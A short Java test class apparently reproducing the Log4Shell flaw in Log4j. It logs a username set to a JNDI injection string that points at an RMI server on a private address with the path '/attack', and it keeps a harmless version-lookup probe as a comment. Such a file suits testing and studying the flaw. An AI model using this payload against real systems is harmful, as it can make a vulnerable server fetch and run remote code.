package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author i531869
 * @Date 12/21/21 2:27 PM
 * @Version 1.0
 */
public class Log4jTest {
  private static final Logger logger = LogManager.getLogger();

  public static void main(String[] args) {
    String username = "${jndi:rmi://192.168.31.198:1099/attack}";
    // String username = "${java:version}";
    logger.error("hello, {}", username);
  }
}
